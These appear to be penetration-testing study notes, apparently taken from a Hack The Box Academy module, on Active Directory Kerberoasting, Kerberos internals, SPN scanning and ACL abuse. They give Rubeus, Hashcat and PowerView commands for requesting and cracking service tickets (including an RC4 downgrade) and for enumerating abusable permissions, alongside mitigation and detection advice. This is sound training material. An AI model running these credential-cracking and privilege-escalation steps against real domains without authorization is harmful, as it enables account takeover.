	> Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.
	> Requesting a New Ticket
		PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

	> To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) per the handy Hashcat example_hashes table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.
	> Running Hashcat & Checking the Status of the Cracking Job
		m1l0js@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 

	> When the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. This would be greatly magnified with a stronger/longer password.
	> We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.
	> Using the /tgtdeleg Flag
		PS C:\htb>  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap

	> In the above image, we can see that when supplying the /tgtdeleg flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.
	> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.
	> It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.

* Mitigation & Detection

	> An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use Managed Service Accounts (MSA ==> https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and Group Managed Service Accounts (gMSA ==> https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
	> Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting Audit Kerberos Service Ticket Operations within Group Policy.
		Policies => Windows Settings => Security settings => Advanced Audit Policy Configuration
	> Doing so will generate two separate event IDs: 4769: A Kerberos service ticket was requested, and 4770: A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
	> Below we can see an example of a Kerberoasting attack being logged. We see many event ID 4769 being logged in succession, which appears to be anomalous behavior. Clicking into one, we can see that a Kerberos service ticket was requested by the htb-student user (attacker) for the sqldev account (target). We can also see that the ticket encryption type is 0x17, which is the hex value for 23 (DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256), meaning that the requested ticket was RC4, so if the password was weak, there is a good chance that the attacker would be able to crack it and gain control of the sqldev account.
		(https://academy.hackthebox.com/storage/modules/143/4769.png)

	> Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).
	> This excellent post(https://adsecurity.org/?p=3458) by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.

* Continuing Onwards
	> Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:

    		- Access a host via RDP or WinRM as a local user or a local admin
    		- Authenticate to a remote host as an admin using a tool such as PsExec
    		- Gain access to a sensitive file share
    		- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges

	> Regardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.

-=-=-=Aclaracion de unos conceptos anteriores
[+] Kerberos overview & communication process
	(https://adsecurity.org/wp-content/uploads/2015/04/Visio-KerberosComms.png)
[+] Kerberos overview
	> Active Directory implements Kerberos version 5 in two components: the Authentication service and the Ticket-granting service.
	> The Authentication Service (AS) is the first contact the client has with Kerberos and is used to lookup the user’s password and create the Ticket Granting Ticket (TGT). The AS also creates the session key the user will use for future communication with Kerberos.
	> The Ticket Granting Ticket (TGT) is the Kerberos ticket for the Ticket Granting Service (runs on the KDC) and is encrypted using the KDC key (KRBTGT domain Kerberos account), meaning that only a KDC can decrypt and read the ticket. While the user’s ticket ,the TGT, is set to expire after 10 hours (AD default), it can be renewed as often as needed during the TGT renewable lifetime which is 7 days (AD default). Once the authenticating user has a TGT, it presents the TGT to the KDC to get a Service Ticket for the Ticket Granting Service (TGS) on the KDC. Most key Kerberos communication occurs over UDP port 88, though starting with Windows Vista & Windows Server 2008 now default to using TCP for Kerberos ticket requests.
	> There is a myth in the Windows Kerberos world that if a workstation’s clock is skewed more than 5 minutes from that of the Domain Controller, Kerberos authentication wouldn’t work.
	> Technically, all clocks in the Kerberos world must be kept closely in-sync to prevent replay attacks. By default, Microsoft Active Directory has a tolerance of 5 minutes. Though in most cases, this doesn’t mater. When a client sends a Kerberos request to a DC, the DC will reply with a “KRB_ERROR – KRB_AP_ERR_SKEW (37)” and the Windows client will update its time for the Kerberos session with the DC and resend the request. Provided the clock skew between the client and DC is not more than the ticket lifetime (10 hours by default), the second request will be successful.
		! Kerberized Internet Negotiation of Keys (KINK) RFC 4430 details how this works:
    		! If the server clock and the client clock are off by more than the policy-determined clock skew limit (usually 5 minutes), the server MUST return a KRB_AP_ERR_SKEW.  The optional client’s time in the KRB-ERROR SHOULD be filled out.  If the server protects the error by adding the Cksum field and returning the correct client’s time, the client SHOULD compute the difference (in seconds) between the two clocks based upon the client and server time contained in the KRB-ERROR message.  The client SHOULD store this clock difference and use it to adjust its clock in subsequent messages.  If the error is not protected, the client MUST NOT use the difference to adjust subsequent messages, because doing so would allow an attacker to construct authenticators that can be used to mount replay attacks.

* More simpler
	> Every service that is Kerberos enabled has an entry point called a Service Principal Name (SPN) and each Kerberos user has a User Principal Name (UPN). For example, a user named Joe User in the ADSECURITY.ORG Kerberos realm aka AD domain (the Kerberos realm is always all Caps) has a UPN of JoeUser@ADSecurity.org. If Joe User initiates a connection to the share path \\server1.ADSecurity.org\Shared then Joe’s workstation will lookup the computer server1.ADSecurity.org in Active Directory and read its SPN attribute (cifs/server1.ADSecurity.org). The computer SPN is used to identify the application server in the Kerberos TGS ticket request. Furthermore, when Joe opens Outlook, his workstation performs similar actions looking up the Exchange server’s SPN

*  Ticket Granting Ticket (aka logon ticket)
1. Joe User logs on with his Active Directory user name and password to a domain-joined computer (usually a workstation). The computer takes the user’s password and runs a one way function (OWF) creating a hash of the password (typically the NTLM hash). Hashing the password is like taking a steak and running it through a meat grinder. The ground beef that is the result can never be reassembled back into the same steak we started with.
This is used to  handle all Kerberos requests for the user (as well as other authentication methods such as NTLM).
2. Kerberos authentication is initiated by sending a timestamp (PREAUTH data) encrypted with the user’s password-based encryption key (password NTLM hash).
3. The user account (JoeUser@adsecurity.org) requests a Kerberos service ticket (TGT) with PREAUTH data (Kerberos Authentication Service Request or AS-REQ).
4. The Domain Controller’s Kerberos service (KDC) receives the authentication request, validates the data, and replies with a TGT (Kerberos AS-REP). The TGT has a Privileged Attribute Certificate (PAC) which contains all the security groups in which the user is a member. The TGT is encrypted and signed by the KDC service account (KRBTGT) and only the domain KRBTGT account can read the data in the TGT.

At this point, the user has a valid TGT which contains the users group membership and is used to prove the user is who they claim to be in further conversations with a Domain Controller (KDC). The TGT is sent to the Domain Controller every time a resource ticket is requested.

* Ticket Granting Service ticket (aka resource access ticket)
	5. When the user wants to access an AD resource (a file share for example), the user’s TGT from step 4 is presented to a Domain Controller (KDC) as proof of identity with a request for a resource ticket to a specific resource (Service Principal Name). The DC determines if the TGT is valid by checking the TGT’s signature and if valid, generates a resource access ticket (TGS) signed/encrypted with the KRBTGT account and a part encrypted with the Kerberos service account’s session key which the destination service uses to validate the TGS.
	Note: The DC doesn’t validate the user has the appropriate access to the service, it only validates the TGT and builds a TGS based on the TGT information.
	6. The resource service ticket (TGS) is sent to the user by the Domain Controller and is used for authentication to the resource. At this point, all communication has been between the user’s computer and the Domain Controller (KDC).
	7. The user’s computer sends the user’s resource service ticket (TGS) to the service on the resource computer. If the destination service is a file share, the TGS is presented to the CIFS service for access.
	8. The destination service (CIFS in this example) validates the TGS by ensuring it can decrypt the TGS component encrypted with the service’s session key. The service may send the TGS to a DC (KDC) to validate the PAC to ensure the user’s group membership presented is accurate. The service reviews the user’s group membership to determine what level of access, if any, the user has to the resource.


* THE DETAILED PROCESS

Here’s my example scenario to explain what occurs when a user logs on and opens Outlook to view his Exchange email. The bold text is the simple overview version while the detail follows.

1.  	A user logs onto the domain ADSecurity.org on the workstation ADSecurityPC.
2.	The user requests authentication by sending a timestamp encrypted with the users password encryption key.
    		The workstation creates an encryption key derived from the user’s password (the user’s password is hashed using a one way function such as MD5 = (A) key) to encrypt a timestamp (date/time) as an authenticator (pre-authentication is required by AD in its default configuration, so the client must send an authenticator) . The authenticator is simply a method the client uses to prove to the KDC that the user is who he claims to be (since only the user & the KDC knows his password) and protects against replay attacks. This information is sent to the KDC in an AS-REQ (Authentication Service Request) packet. This request includes the client supported encryption algorithms.Keys used:
    		(A)User’s password derived keyPacket Data:
    		User account (user@ADSecurity.org) requests Kerberos service ticket (TGT) with PREAUTH dataKRB5: Kerberos AS-REQ
    		1 Forwardable: FORWARDABLE tickets are allowed/requested
    		1 Renewable: This ticket is RENEWABLE
    		1 Canonicalize: This is a request for a CANONICALIZED ticket
    		1 Renewable OK: We accept RENEWED ticketsClient Name (Principal): admin
    		Realm: ADSECURITY.ORG
    		Service: krbtgt/ADSecurity.org
    		till: 2037-09-12 02:48:05 (UTC)
    		rtime: 2037-09-12 02:48:05 (UTC)
    		Nonce: 1976014234
    		Principal Name: user
    		HostAddress: METCORPORGDC02<20>
    		PAC_Request: True
    		Encryption Types: aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac rc4-hmac-exp rc4-hmac-old-exp des-cbc-md5KRB5: Kerberos AS-REP
    		Client Name (Principal): user
    		Tkt-vno: 5

3.   	The Kerberos server (KDC) receives the authentication request, validates the data, and replies with a TGT.
    		The KDC receives the AS-REQ, decrypts the authenticator (encrypted with key (A)), and validates the timestamp is within the time skew limits set by the domain (5 minutes by default). If the KDC is satisfied the request is a valid user request, the KDC responds with an AS-REP packet which includes the TGT. The TGT can only be decrypted by a KDC (using the (B) key) and is used to authenticate the user to the Kerberos server so it doesn’t have to look up the user’s password (long-term key) again. The KDC also includes a session key ((C)key) for use in future communication with the KC.Keys used:
    		(B) Kerberos account’s password derived key
    		(C)User’s Kerberos service (KDC) session key NOTE: The TGT is encrypted with the KRBTGT account password so only a valid Kerberos server can decrypt it. In an environment with RODCs, each RODC has its own krbtgt account with a unique password. This means that if a user presents a TGT received from a RODC to a writable DC, the DC dumps the TGT and generates a new one.Packet Data:
    		The KDC replies with the TGT and session key
    		KRB5: Kerberos AS-REP
    		Client Name (Principal): User
    		Ticket (Tkt-vno): 5
    		Realm: ADSECURITY.ORG
    		Server Name: krbtgt/ADSecurity.org
    		enc-part aes256-cts-hmac-sha1-96
    		[Encrypted Key]
    		enc-part rc4-hmac
    		[Encrypted Key]
4.	The user opens Outlook which locates the user’s mailbox server and requests a TGS ticket for access.
    		The workstation locates the Exchange mailbox server containing the user’s mailbox (MetcorpEXMB02.ADSecurity.org) and reads the ServicePrincipalName attribute on the computer account in AD (ExchangeMDB/ADSecurityEXMB02.ADSecurity.org – there are a bunch, so I will just use this one for the example).
    		The client then sends a TGS-REQ to the KDC requesting a TGS for access to the Exchange service running on the MetcorpEXMB02 Exchange server. The TGS request includes the target server SPN, the user’s TGT (encrypted with the (B) key), and an authenticator (encrypted with the (C)key).Keys used:
    		(B) Kerberos account’s password derived key
    		(C)User’s Kerberos service (KDC) session keyPacket Data:
    		User account requests service ticket (TGS) for MetcorpEXMB02 Exchange service access
    		KRB5: Kerberos TGS-REQ
    		1 Forwardable: FORWARDABLE tickets are allowed/requested
    		1 Renewable: This ticket is RENEWABLE
    		1 Canonicalize: This is a request for a CANONICALIZED ticket
    		Realm: ADSECURITY.ORG
    		Server Name: ExchangeMDB/MetcorpEXMB02.ADSecurity.org
    		till: 2037-09-12 02:48:05 (UTC)
    		Nonce: 1976014234
    		Encryption Types: aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac rc4-hmac-exp rc4-hmac-old-exp des-cbc-md5KRB5: Kerberos AS-REP
5.	The KDC validates the TGS request and replies with the TGS.
    		The KDC replies with a TGS-REP packet to the client which includes 2 session tickets (TGS) (2?). One of the session tickets is encrypted with the user’s (KDC) session key ((C) key) and the second one is encrypted with the target server’s (KDC) session key ((D) key). The second TGS also includes the user’s group membership & associated SIDs which provides the server information used to determine authorization and help the server determine: Is the user allowed to access the server’s resource?
    		Both session tickets include a new session key ((E)key) for exclusive use in communication between the Exchange server and the user.Keys used:
    		(C) User’s Kerberos service (KDC) session key
    		(D) Server’s Kerberos service (KDC) session key
    		(E)User-Exchange service session keyPacket Data:
    		The KDC replies with the service ticket (TGS) for MetcorpEXMB02 Exchange service access
    		KRB5: Kerberos TGS-REP
    		Client Name (Principal): User
    		Ticket (Tkt-vno): 5
    		Realm: ADSECURITY.ORG
    		Server Name: krbtgt/ADSecurity.org
    		enc-part aes256-cts-hmac-sha1-96
    		[Encrypted Key]
    		enc-part rc4-hmac
    		[Encrypted Key]
6.	The client authenticates to the Exchange server with the session ticket.
    		The client sends the target server (MetcorpEXMB02.ADSecurity.org) an AP-REQ packet containing the TGS it received from the KDC encrypted with the server’s session key ((D) key) and an authenticator encrypted with the user-Exchange server session key ((E) key) . This lets the Exchange server know that the user was authenticated to the Kerberos domain (realm) and that the TGS is valid (assuming the Exchange server is able to decrypt it). The client also sends the server an authenticator (timestamp) encrypted with the session key ((E)key) it received from the KDC in Step 5. The Exchange server decrypts the TGS, extracts the user’s group information, extracts the session key, and uses the session key to decrypt the authenticator. This provides the server enough information to make an authorization decision. If the user is authorized to connect to the server, it sends a reply.Keys used:
    		(C) User’s Kerberos service (KDC) session key
    		(D) Server’s Kerberos service (KDC) session key
    		(E) User-Exchange service session key
7.	The Exchange server replies that authorization to the service is granted.
    		The Exchange server sends the client an AP-REP packet which includes its own authenticator encrypted with the user-Exchange service session key ((E) key). This assumes the client requested mutual authentication which is the default configuration.Keys used:
    		(E)User-Exchange service session key

* Note: This is a simplified explanation of Kerberos and doesn’t cover everything involved in this process.

* Kerberos Key Storage Locatons
	> Workstation Keys:
    		- User Key
    		- Ticket-Granting Ticket
    		- Ticket-Granting Service Session Key
    		- Service Ticket
    		- Session Key
	> Domain Controller:

    		- User Key
    		- Ticket-Granting Service Key
    		- Service Key

	> Server:
    		- Service Key
    		- Session Key


* DEFAULT AD KERBEROS POLICY SETTINGS
    	- Enforce user logon restrictions: Enabled
    	- Maximum lifetime for service ticket: 600 minutes (10 hours)
    	- Maximum lifetime for user ticket: 600 minutes (10 hours)
    	- Maximum lifetime for user ticket renewal : 7 days
    - Maximum tolerance for computer clock synchronization: 5 minutes

[+] Honeypot with Kerberos => (https://adsecurity.org/?p=3513)

	PS C:\Windows\system32> $KerberoastEventData | where{$_.ServiceName -like "*Honeypot*"} | select EventID,Date,AccountName,ClientAddress,ServiceName



-=-=-=

[+] SPN Scanning - Service Discovery without Network Port Scanning
	> The best way to discover services in an Active Directory environment is through what I call “SPN Scanning.”
	> The primary benefit of SPN scanning for an attacker over network port scanning is that SPN scanning doesn’t require connections to every IP on the network to check service ports. SPN scanning performs service discovery via LDAP queries to a Domain Controller. Since SPN queries are part of normal Kerberos ticket behavior, it is difficult, if not infeasible to detect, while netowkr port scanning is pretty obvious.
	> Service Principal Names (SPNs) are required for discovery of services that leverage Kerberos authentication.

* SPN Format 
	> An SPN is a string of the following format. For more information on the <alphanum> element, see [RFC2396] section 1.6.
		SPN = serviceclass “/” hostname [“:”port] [“/” servicename]
		serviceclass = alphanum
		servicename = alphanum
		Where:
		serviceclass is a string that identifies the class of the service, such as “www” for a Web service or “ldap” for a directory service.
		hostname ([RFC2396] section 3.2.2) is a string that is the name of the system. This SHOULD be the fully qualified domain name (FQDN).
		port ([RFC2396] section 3.2.2) is a number that is the port number for the service.

	> The servicename segment is a string that is the distinguished name (DN), objectGuid, Internet host name, or fully qualified domain name (FQDN) for the service.
	> An application can supply a name of the form “RestrictedKrbHost/<hostname>” when its callers have provided the hostname but not the correct SPN for the service. Applications SHOULD NOT use “RestrictedKrbHost/<hostname>” due to the security considerations in section 5.1.2. Applications calling GSS-API directly MUST provide a target name which SHOULD be an SPN<28> for their service applications for Kerberos authentication.

* Some of the more interesting services and example SPNs:
	> SQL servers, instances, ports, etc.
    	     MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433
    	> Exchange
    	     exchangeMDB/adsmsEXCAS01.adsecurity.org
    	> RDP
    	     TERMSERV/adsmsEXCAS01.adsecurity.org
    	> WSMan / WinRM / PS Remoting
    	     WSMAN/adsmsEXCAS01.adsecurity.org
    	> Hyper-V Host
    	     Microsoft Virtual Console Service/adsmsHV01.adsecurity.org
    	> VMWare VCenter
    	     STS/adsmsVC01.adsecurity.org


* Once the attacker has a list of Service Principal Names (SPNs) associated with service accounts, these SPNs can be used to request Kerberos TGS service tickets useful for offline TGS password cracking.
	> If you have the Active Directory PowerShell module installed, you can easily find all SPNs of a specific type with Get-ADObject
		get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
	> The AD PowerShell module quickly installs on Windows Server 2008R2 and newer:
		import-module servermanager ; add-windowsfeature RSAT-AD-PowerShell

* Note: This attack will not be successful when targeting services hosted by the Windows system since these services are mapped to the computer account in Active Directory which has an associated 128 character password which won’t be cracked anytime soon.

	> This attack involves requesting a Kerberos service ticket(s) (TGS) for the Service Principal Name (SPN) of the target service account. This request uses a valid domain user’s authentication ticket (TGT) to request one or several service tickets for a target service running on a server. The Domain Controller doesn’t track if the user ever actually connects to these resources (or even if the user has access). The Domain Controller looks up the SPN in Active Directory and encrypts the ticket using the service account associated with the SPN in order for the service to validate user access. The encryption type of the requested Kerberos service ticket is RC4_HMAC_MD5 which means the service account’s NTLM password hash is used to encrypt the service ticket. This means that Kerberoast can attempt to open the Kerberos ticket by trying different NTLM hashes and when the ticket is successfully opened, the correct service account password is discovered.
	> No elevated rights are required to get the service tickets and no traffic is sent to the target.



-=-=-=
[+] Access Control List (ACL) Abuse Primer
	> For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.

* Access Control List (ACL) Overview

	> In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entities (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

	> There are two types of ACLs:

    		- Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
    		- System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.

	> We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.

	> Viewing forend's ACL ==> (https://academy.hackthebox.com/storage/modules/143/DACL_example.png)
		- The SACLs can be seen within the Auditing tab.

	> Viewing the SACLs through the Auditing Tab ==> (https://academy.hackthebox.com/storage/modules/143/SACL_example.png)

* Access Control Entities (ACEs)
	> As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:
		ACE 	Description
		Access denied ACE 	Used within a DACL to show that a user or group is explicitly denied access to an object
		Access allowed ACE 	Used within a DACL to show that a user or group is explicitly granted access to an object
		System audit ACE 	Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred

	> Each ACE is made up of the following four components:

    		- The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
    		- A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
    		- A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
    		- An access mask(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

		> We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:
	> Viewing Permissions through Active Directory Users & Computers => (https://academy.hackthebox.com/storage/modules/143/ACE_example.png)


    		- The security principal is Angela Dunn (adunn@inlanefreight.local)
    		- The ACE type is Allow
    		- Inheritance applies to the "This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted
    		- The rights granted to the object, again shown graphically in this example

	> When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.

[+] Why are ACEs Important?

	> Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

    		- ForceChangePassword abused with Set-DomainUserPassword
    		- Add Members abused with Add-DomainGroupMember
    		- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
    		- GenericWrite abused with Set-DomainObject
    		- WriteOwner abused with Set-DomainObjectOwner
    		- WriteDACL abused with Add-DomainObjectACL
    		- AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
    		- Addself abused with Add-DomainGroupMember

	> In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:

    		- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
    		- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
    		- AddSelf - shows security groups that a user can add themselves to.
    		- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

	> This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux => (https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)


	> We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there  are tools such as GMSAPasswordReader(https://github.com/rvazarkar/GMSAPasswordReader) that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.

* ACL Attacks in the Wild

	> We can use ACL attacks for:

    		- Lateral movement
    		- Privilege escalation
    		- Persistence

	> Some common attack scenarios may include:
	Attack 					Description
	- Abusing forgot password permissions 	Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.
	- Abusing group membership management 	It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.
	- Excessive user rights 	We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.

	> There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.
	> Note: Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly. 


[+] ACL Enumeration

	> Let's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be leveraged to gain us further access in the internal environment.

* Enumerating ACLs with PowerView

	> We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function Find-InterestingDomainAcl we will receive a massive amount of information back that we would need to dig through to make any sense of:
	> Using Find-InterestingDomainAcl
		PS C:\htb> Find-InterestingDomainAcl

	> If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user wley, which we obtained after solving the last question in the LLMNR/NBT-NS Poisoning - from Linux section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.
	> Using Find-InterestingDomainAcl
		PS C:\htb> Import-Module .\PowerView.ps1
		PS C:\htb> $sid = Convert-NameToSid wley

	> We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.
	> Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.
	> Using Get-DomainObjectACL
		PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

			ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
			ActiveDirectoryRights  : ExtendedRight
			ObjectAceFlags         : ObjectAceTypePresent
			ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
			InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
			BinaryLength           : 56
			AceQualifier           : AccessAllowed
			IsCallback             : False
			OpaqueLength           : 0
			AccessMask             : 256
			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
			AceType                : AccessAllowedObject
			AceFlags               : ContainerInherit
			IsInherited            : False
			InheritanceFlags       : ContainerInherit
			PropagationFlags       : None
			AuditFlags             : None

	> We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover this(https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.
	> Performing a Reverse Search & Mapping to a GUID Value
		PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
